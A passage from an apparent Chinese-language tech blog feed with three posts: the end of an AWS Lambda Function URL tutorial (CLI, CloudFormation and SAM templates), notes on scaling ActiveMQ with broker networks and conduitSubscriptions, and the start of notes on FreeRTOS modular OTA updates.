<code>create-function</code> 命令建立一個 Lambda 函數。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws lambda create-function \</span><br><span class="line">    --function-name my-url-function \</span><br><span class="line">    --runtime nodejs18.x \</span><br><span class="line">    --zip-file fileb://function.zip \</span><br><span class="line">    --handler index.handler \</span><br><span class="line">    --role arn:aws:iam::1XXXXXXXXXXX:role/Lambda-URL_Role</span><br></pre></td></tr></table></figure><p><img src="/img/AWS/Lambda_URL/deployment_package.png"></p><ol start="4"><li>將 resource policy 新增至授予許可的函數，以允許公開存取函數 URL。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws lambda add-permission \</span><br><span class="line">    --function-name my-url-function \</span><br><span class="line">    --action lambda:InvokeFunctionUrl \</span><br><span class="line">    --principal &quot;*&quot; \</span><br><span class="line">    --function-url-auth-type &quot;NONE&quot; \</span><br><span class="line">    --statement-id url</span><br></pre></td></tr></table></figure><blockquote><p>因為是測試方便所以選 NONE，但最好還是要提供AWS_IAM驗證</p></blockquote><p>Return policy</p><p><img src="/img/AWS/Lambda_URL/return_policy.png"></p><ol start="5"><li>使用 <code>create-function-url-config</code> 命令為函數建立 URL 端點</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws lambda create-function-url-config \</span><br><span class="line">    --function-name my-url-function \</span><br><span class="line">    --auth-type NONE</span><br></pre></td></tr></table></figure><p>Return Endpoint</p><p><img src="/img/AWS/Lambda_URL/return_endpoint.png"></p><p>Endpoint:  <a href="https://xxxxxxxxxxuxxxxxxxxxxxxxxxxxxxxxx.lambda-url.us-east-1.on.aws/">https://xxxxxxxxxxuxxxxxxxxxxxxxxxxxxxxxx.lambda-url.us-east-1.on.aws/</a></p><h2 id="測試端點"><a href="#測試端點" class="headerlink" title="測試端點"></a>測試端點</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;https://abcdefg.lambda-url.us-east-1.on.aws/&#x27; \</span><br><span class="line">-H &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">-d &#x27;&#123;&quot;num1&quot;: &quot;10&quot;, &quot;num2&quot;: &quot;10&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/AWS/Lambda_URL/test_endpoint.png"></p><h2 id="建立函數-URL-的-CloudFormation"><a href="#建立函數-URL-的-CloudFormation" class="headerlink" title="建立函數 URL 的 CloudFormation"></a>建立函數 URL 的 CloudFormation</h2><p>下面是用於建立 Function URL 的CFN YAML檔，可以輕鬆建立對應資源:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Resources:</span></span><br><span class="line">  <span class="attr">MyUrlFunction:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Lambda::Function</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Handler:</span> <span class="string">index.handler</span></span><br><span class="line">      <span class="attr">Runtime:</span> <span class="string">nodejs18.x</span></span><br><span class="line">      <span class="attr">Role:</span> <span class="string">arn:aws:iam::123456789012:role/lambda-url-role</span></span><br><span class="line">      <span class="attr">Code:</span></span><br><span class="line">        <span class="attr">ZipFile:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          exports.handler = async (event) =&gt; &#123;</span></span><br><span class="line"><span class="string">              let body = JSON.parse(event.body);</span></span><br><span class="line"><span class="string">              const product = body.num1 * body.num2;</span></span><br><span class="line"><span class="string">              const response = &#123;</span></span><br><span class="line"><span class="string">                  statusCode: 200,</span></span><br><span class="line"><span class="string">                  body: &quot;The product of &quot; + body.num1 + &quot; and &quot; + body.num2 + &quot; is &quot; + product,</span></span><br><span class="line"><span class="string">              &#125;;</span></span><br><span class="line"><span class="string">              return response;</span></span><br><span class="line"><span class="string">          &#125;;</span></span><br><span class="line"><span class="string"></span>      <span class="attr">Description:</span> <span class="string">Create</span> <span class="string">a</span> <span class="string">function</span> <span class="string">with</span> <span class="string">a</span> <span class="string">URL.</span></span><br><span class="line">  <span class="attr">MyUrlFunctionPermissions:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Lambda::Permission</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">FunctionName:</span> <span class="type">!Ref</span> <span class="string">MyUrlFunction</span></span><br><span class="line">      <span class="attr">Action:</span> <span class="string">lambda:InvokeFunctionUrl</span></span><br><span class="line">      <span class="attr">Principal:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">      <span class="attr">FunctionUrlAuthType:</span> <span class="string">NONE</span></span><br><span class="line">  <span class="attr">MyFunctionUrl:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Lambda::Url</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">TargetFunctionArn:</span> <span class="type">!Ref</span> <span class="string">MyUrlFunction</span></span><br><span class="line">      <span class="attr">AuthType:</span> <span class="string">NONE</span></span><br></pre></td></tr></table></figure><h2 id="建立具有函數-URL-的-Lambda-函數-AWS-SAM"><a href="#建立具有函數-URL-的-Lambda-函數-AWS-SAM" class="headerlink" title="建立具有函數 URL 的 Lambda 函數 (AWS SAM)"></a>建立具有函數 URL 的 Lambda 函數 (AWS SAM)</h2><p>而這個是可以透過SAM 建立資源的YAML檔</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ProductFunction:</span></span><br><span class="line">  <span class="attr">Type:</span> <span class="string">AWS::Serverless::Function</span></span><br><span class="line">  <span class="attr">Properties:</span></span><br><span class="line">    <span class="attr">CodeUri:</span> <span class="string">function/.</span></span><br><span class="line">    <span class="attr">Handler:</span> <span class="string">index.handler</span></span><br><span class="line">    <span class="attr">Runtime:</span> <span class="string">nodejs18.x</span></span><br><span class="line">    <span class="attr">AutoPublishAlias:</span> <span class="string">live</span></span><br><span class="line">    <span class="attr">FunctionUrlConfig:</span></span><br><span class="line">      <span class="attr">AuthType:</span> <span class="string">NONE</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-urls.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-urls.html</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/urls-tutorial.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/urls-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>橫向擴展ActiveMQ</title>
      <link href="/posts/b509904.html"/>
      <url>/posts/b509904.html</url>
      
        <content type="html"><![CDATA[<h2 id="Amazon-MQ"><a href="#Amazon-MQ" class="headerlink" title="Amazon MQ"></a>Amazon MQ</h2><p>Amzon MQ 上有託管 Active MQ 這個訊息佇列的服務，近期有碰到問題是問說，<strong>要怎麼樣在 Amazon MQ 上做 Horizontal Scaling</strong>，</p><p>首先簡單解釋一下 Vertical Scaling 跟 Horizontal Scaling 的差異。</p><p>Scaling意味著擴展，Vertical Scaling著重於單一實體的運算能力增強，所以Vertical Scaling可能會是更好的 CPU&#x2F;GPU,更大的記憶體容量等等，</p><p>以 AWS 服務來說，可能會是更換實例，MQ的話就會是從 <code>t3.Micro</code> 換成 <code>m5.large</code></p><blockquote><p>[+] 執行個體類型 - <a href="https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html">https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html</a></p></blockquote><p>而若要水平擴展，通常代表架構會接收到更多消息，所以會需要根據流量&#x2F;訊息量來去擴展並且分擔單一實例的負擔。</p><h2 id="ActiveMQ-代理網路（Network-of-brokers）"><a href="#ActiveMQ-代理網路（Network-of-brokers）" class="headerlink" title="ActiveMQ 代理網路（Network of brokers）"></a>ActiveMQ 代理網路（Network of brokers）</h2><p>這是一個 ActiveMQ 的原生功能，代理網路包含了多個連接在一起的 Brokers，代理程式之間可共享所代管 client 端以及目標資訊，代理程式之間可以透過網路來路由資訊。</p><p>代理程式可以是：</p><ul><li>Single Instance Broker (節點失敗會無法使用，除非重新啟動)</li><li>Active&#x2F;Standby Brokers (網路中有待命模式的 broker，可以共用儲存空間，若Active 節點失敗，則由 Standby 接管)</li></ul><p>一般來說，若有 Horizontal Scaling的需求，會使用代理網路</p><blockquote><p>[+] Amazon MQ 代理程式網路 - <a href="https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/network-of-brokers.html">https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/network-of-brokers.html</a></p></blockquote><p>下面會逐步帶建構的步驟</p><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p><img src="/img/ActiveMQ/ActiveMQ1.png"></p><p><img src="/img/ActiveMQ/ActiveMQ2.png"></p><p><img src="/img/ActiveMQ/ActiveMQ3.png"></p><p><img src="/img/ActiveMQ/ActiveMQ4.png"></p><p>選擇 <strong>Next</strong></p><p><img src="/img/ActiveMQ/ActiveMQ5.png"></p><p>這時可以下載 CloudFormation 模板，未來可以方便修改配置重新部署</p><p>預估部署所需時間： <strong>25 minutes</strong></p><p><img src="/img/ActiveMQ/ActiveMQ6.png"></p><p>可以發現三個 Broker 都正在部署中</p><p><img src="/img/ActiveMQ/ActiveMQ7.png"></p><p>可以點進去 broker 查看詳細的設定配置</p><p><img src="/img/ActiveMQ/ActiveMQ8.png"></p><p>在設定檔當中可以透過編輯 <code>&lt;networkConnector&gt;&lt;/networkConnector&gt;</code> 當中的屬性進行 MQ 拓墣上的設計</p><p>以下是目前建立的 Broker的設定</p><ul><li>Broker1 上面的 <networkConnectors> 設置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;networkConnectors&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">  &lt;/networkConnectors&gt;</span><br></pre></td></tr></table></figure><ul><li>Broker2 上面的 <networkConnectors> 設置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;networkConnectors&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">  &lt;/networkConnectors&gt;</span><br></pre></td></tr></table></figure><ul><li>Broker3 上面的 <networkConnectors> 設置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;networkConnectors&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">  &lt;/networkConnectors&gt;</span><br></pre></td></tr></table></figure><h3 id="conduitSubscriptions-屬性"><a href="#conduitSubscriptions-屬性" class="headerlink" title="conduitSubscriptions 屬性"></a>conduitSubscriptions 屬性</h3><p>根據 ActiveMQ 官方文件 </p><blockquote><p><a href="https://activemq.apache.org/networks-of-brokers">https://activemq.apache.org/networks-of-brokers</a></p></blockquote><p><img src="/img/ActiveMQ/ActiveMQ9.png"></p><p>訂閱相同目的地的多位消費者被網路視為一個消費者，這是為了避免有收到相同消息的狀況</p><p>ActiveMQ 會依賴有關活動消費者（訂閱者）的資訊來在網絡中傳遞訊息，<strong>使用 Conduit Subscription時，如果有多個遠端訂閱，遠程代理將每個消息的副本視為有效，這可能導致訊息重復的狀況產生</strong>。</p><p>因此，預設的 Conduit 行為會去<strong>整合所有匹配的訂閱訊息，以防止在網絡中傳播重複</strong>。</p><p>這樣，遠程代理上的 <code>N</code> 個訂閱看起來對於網絡代理來說就像是一個單一的訂閱。</p><blockquote><p>然而，如果只使用 Queue，重複的訂閱是一個有用的功能，因為負載平衡算法將嘗試均勻分配消息負載，僅當 <code>conduitSubscriptions=false</code> 時，跨網絡的消費者才會均勻分享消息負載。</p></blockquote><p>舉例來說，有兩個代理，A 和 B，它們通過一個 proxy bridge 相互連接。</p><p>連接到代理 A 的消費者訂閱一個名為 <code>Q.TEST</code> 的Queue，連接到代理 B 的兩個消費者也訂閱 <code>Q.TEST</code>，所以這裡有三個消費者，並且假設所有消費者具有相等的優先級。</p><p>然後，在代理 A 上啟動一個生產者，將 30 條消息寫入 <code>Q.TEST</code>。默認情況下（<code>conduitSubscriptions=true</code>），將有 15 條消息發送到代理 A 上的消費者，其餘的 15 條消息將發送到代理 B 上的兩個消費者。</p><p><strong>但也由於預設狀況下，代理 A 將代理 B 上的兩個訂閱視為一個，消息負載並未均勻分佈在所有三個消費者之間。</strong></p><p>但如果你將 <code>conduitSubscriptions</code> 設置為 <code>false</code>，那麼三個消費者中的每個將分配到 10 條消息。</p><h2 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h2><p>[+] 執行個體類型 - <a href="https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html">https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html</a><br>[+] Amazon MQ 代理网络 - 代理网络的工作原理是什么？ - <a href="https://docs.aws.amazon.com/zh_cn/amazon-mq/latest/developer-guide/network-of-brokers.html#how-does-it-work">https://docs.aws.amazon.com/zh_cn/amazon-mq/latest/developer-guide/network-of-brokers.html#how-does-it-work</a><br>[+]ActiveMQ - NetworkConnectors - <a href="https://activemq.apache.org/networks-of-brokers">https://activemq.apache.org/networks-of-brokers</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> ActiveMQ </tag>
            
            <tag> MQ </tag>
            
            <tag> Scaling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【學習筆記】OTA Update -1</title>
      <link href="/posts/613d9ed0.html"/>
      <url>/posts/613d9ed0.html</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-OTA-Update-Over-The-Air-Updtae"><a href="#什麼是-OTA-Update-Over-The-Air-Updtae" class="headerlink" title="什麼是 OTA Update (Over The Air Updtae)?"></a>什麼是 OTA Update (Over The Air Updtae)?</h2><p>透過無線通訊去對設備進行軟體&#x2F;韌體更新</p><h2 id="OTA-的流程"><a href="#OTA-的流程" class="headerlink" title="OTA 的流程"></a>OTA 的流程</h2><ul><li>Notify<ul><li>設備會被通知有擱置的OTA更新</li><li>設備可以選擇忽略更新或者接受更新以觸發下載</li></ul></li><li>Download<ul><li>設備通過各種支援的協定進行更新下載</li><li>更新包會下載到預先設定好的儲存區域<ul><li>Ex. S3 Bucket</li></ul></li><li>更新可能是全新的韌體映像或現有韌體的補丁</li></ul></li><li>Verify<ul><li>驗證更新包的有效性</li></ul></li><li>Install<ul><li>設備通過更新包開始更新（通常是通過 bootloader）成最新的韌體</li><li>安裝後可以執行檢查以驗證功能</li><li>設備將向 OTA 更新提供者報告韌體更新成功</li></ul></li></ul><p>主要分成這四個步驟</p><h2 id="模組化-OTA-更新"><a href="#模組化-OTA-更新" class="headerlink" title="模組化 OTA 更新"></a>模組化 OTA 更新</h2><ul><li>模組化 OTA 由幾個小型函式庫和一個協調器(Orchestrator)組成。</li><li>每個 Lib 負責特定的子任務，例如通知待處理的 OTA 更新或透過 MQTT 下載檔案</li><li>編排器將所有小型程式庫與bootloader 和 Memory Pool 同步以執行 OTA 更新。</li></ul><p>模組化 OTA 方法可讓您根據需求的變化更換或更改 OTA 的不同部分。例如：</p><ol><li>如果您想從 AWS IoT 觸發 OTA，則可以使用 IoT Job Lib檢查新的 OTA 更新或傳送有關 OTA Jobs 狀態的通知。或者，您可以將其替換為任何其他其他的程式庫。</li><li>可以使用IoT Job Lib 中的 <strong>OTA Job Parser</strong> 來解析接收到的OTAJob Document。或者，您可以根據 OTA Job Document 使用自己自訂的 Job Document Parser。</li></ol><h2 id="模組化-OTA-更新流程"><a href="#模組化-OTA-更新流程" class="headerlink" title="模組化 OTA 更新流程"></a>模組化 OTA 更新流程</h2><p>以下是根據 FreeRTOS 官網提供的模組化 OTA更新的流程</p><p><img src="https://hackmd.io/_uploads/Sk_CRjSB6.png" alt="image"></p><h2 id="協調器（Orchestrator）"><a href="#協調器（Orchestrator）" class="headerlink" title="協調器（Orchestrator）"></a>協調器（Orchestrator）</h2><ul><li>Orchestrator 是指定如何協調 OTA 更新的核心元件</li><li>Orchestrator 由使用者提供，並包含所需數量的自訂元件，以完成所需的 OTA 更新方法</li><li>典型的更新將包含「通知」、「下載」、「驗證」和「安裝」階段。 </li><li>Orchestrator 將透過將元件函式庫和其他外部函式庫拼接在一起來提供這些階段</li><li>每個元件函式庫的描述可以在下面找到</li></ul><h2 id="IoT-Job-Libraries"><a href="#IoT-Job-Libraries" class="headerlink" title="IoT Job Libraries"></a>IoT Job Libraries</h2><ul><li>IoT Job Handler 會是整個 OTA Flow 當中第一個使用到的元件</li><li>這個函式庫提供了啟動待處理的 IoT 作業以及更新作業狀態的功能</li><li>當作業處理程序獲悉新的 OTA 更新（透過 IoT Job 進行）時，處理程序將啟動 Job 並將 Job 及其 metadata 傳遞到解析器鏈</li><li>如果設定了解析器來處理該 Job ，它將向 Job Handler 轉送 Job 已成功啟動的資訊</li><li>此成功啟動通知將轉發回 OTA 更新提供者（即 IoT Jobs），以將更新標記為已啟動。如果沒有解析器能夠理解該作業，則啟動 OTA 更新的失敗將轉發給提供者</li></ul><h2 id="OTA-Job-Parser"><a href="#OTA-Job-Parser" class="headerlink" title="OTA Job Parser"></a>OTA Job Parser</h2><p>解析器將驗證 IoT 作業是否為 OTA 更新，並在呼叫下載器之前將欄位解析為可用格式</p><h2 id="MQTT-file-streaming-library"><a href="#MQTT-file-streaming-library" class="headerlink" title="MQTT file streaming library"></a>MQTT file streaming library</h2><ul><li>文件下載器提供下載 OTA 檔案的功能。檔案下載器透過 CBOR 或 JSON 格式的 MQTT Stream 處理下載更新</li><li>下載本身是在 Chunk 上執行的，這更容易被視為整個 OTA 更新檔案的區塊。這樣做是為了提高下載的可靠性，並允許比單一下載「區塊」中可能進行的更大的韌體更新。</li></ul><h2 id="Bootloader-and-Signature-Verifier"><a href="#Bootloader-and-Signature-Verifier" class="headerlink" title="Bootloader and Signature Verifier"></a>Bootloader and Signature Verifier</h2><ul><li>bootloader 的存在是為了驗證新韌體並將其安裝到裝置上</li><li>模組化 OTA 